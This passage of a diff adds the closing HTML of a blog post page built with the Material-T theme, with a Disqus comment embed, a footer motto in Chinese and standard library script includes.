+            this.page.identifier = '/2022/03/云容器安全/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
